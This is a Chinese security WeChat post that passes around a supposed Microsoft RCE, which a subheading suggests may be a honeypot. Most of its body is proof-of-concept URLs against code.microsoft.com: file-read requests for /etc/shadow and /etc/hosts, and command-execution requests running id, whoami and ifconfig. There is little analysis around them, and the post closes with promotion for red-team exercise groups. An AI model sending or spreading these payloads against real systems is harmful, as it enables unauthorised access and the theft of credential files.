#  新瓜速递--微软最新RCE?!   
原创 zyxa  众亦信安   2024-04-26 00:00  
  
**文章导读**  
  
**声明：**  
文中涉及到的技术和工具，仅供学习使用，禁止从事任何非法活动，如因此造成的直接或间接损失，均由使用者自行承担责任。  
  
  
**众亦信安，中意你啊！**  
  
  
  
  
**点不了吃亏，点不了上当，设置星标，方能无恙！**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rl85Sib8ZkaCYxCJKub5bG3w60vxgqrckQwMSg9YrFiaR3PqibBiaZ5YNFIIrAlBTs5l24ysvq3mDX1kYWwvHaeBzA/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
漏洞？-【蜜罐】  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rl85Sib8ZkaBK489OtZenSOBBf6LY0hTTlHh6oUDYqnKR4ib3tzcNibSn7hS4maBtRRUg9luDicGwu3A3q7zs3ia2Qw/640?wx_fmt=png&from=appmsg "")  
  
poc：  
```
http://code.microsoft.com/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=/etc/shadow
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rl85Sib8ZkaBK489OtZenSOBBf6LY0hTTrwzClNPcUY0NVWqCxP033PPdaV5R55vMHMaEGVEkicF9NJXcuB93wtA/640?wx_fmt=png&from=appmsg "")  
           
  
![](https://mmbiz.qpic.cn/mmbiz_png/rl85Sib8ZkaBK489OtZenSOBBf6LY0hTTNyW7ficxzWc0FtibLFdsibTLaeeetlTI9PV3NRsicSRf61Fa7dHxyUJWsQ/640?wx_fmt=png&from=appmsg "")  
  
    poc:  
```
http://code.microsoft.com/pages/systemcall.php?command=id
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rl85Sib8ZkaBK489OtZenSOBBf6LY0hTTl9gibickDBVNtJpvsAjbSo84asYBBTFleaNk55CNrLCgibwVTb25FnnMg/640?wx_fmt=png&from=appmsg "")  
  
  
    poc:  
```
http://code.microsoft.com/pages/systemcall.php?command=whoami
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rl85Sib8ZkaBK489OtZenSOBBf6LY0hTTDad3vqmSr9y7Fcz4wcf1iaIB5kHiaQQYZLlr5eMzF2N8ROPcrQmibPo7g/640?wx_fmt=png&from=appmsg "")  
  
    poc:  
```
 http://code.microsoft.com/pages/systemcall.php?command=ifconfig
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rl85Sib8ZkaBK489OtZenSOBBf6LY0hTTyEUCvOw8IOcSffSXD3ibcleNF4khptytr28KyLIaoXHNdvSOSatqmuQ/640?wx_fmt=png&from=appmsg "")  
  
    poc:  
```
 http://code.microsoft.com/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=/etc/hosts
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rl85Sib8ZkaBK489OtZenSOBBf6LY0hTTo7iaUqoZwfD2rjbnhV5ClibQ1icfIrA0ItTbdLe0Ino29cQNSBVNSxIsw/640?wx_fmt=png&from=appmsg "")  
  
  
****  
  
往这里看  
  
  
  
  
  
  
点点关注不迷路，不定时持续分享各种干货。  
可关注公众号回复"进群"，也可添加管理微信拉你入群。  
  
顺便应师傅们要求弄个24年hvv沟通交流群，群人数满了可以添加下方群主微信回复hvv交流。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rl85Sib8ZkaBK489OtZenSOBBf6LY0hTTCfHWFvyTQeSWCqZGSsvclsqZo9AFJiciaACwKClterzwbG9aSZuJJicMA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
**另外有想去hvv的师傅可以加v**  
  
****  
